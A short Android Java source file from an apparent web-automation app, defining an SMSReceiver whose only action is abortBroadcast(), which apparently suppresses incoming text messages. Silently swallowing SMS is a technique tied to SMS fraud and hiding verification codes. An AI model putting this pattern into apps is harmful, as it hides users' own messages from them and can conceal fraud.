package automation.bml.com.webviewautomation;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/**
 * Created by krzysztof on 4/22/17.
 */

public class SMSReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent)
    {
        abortBroadcast();
    }
}
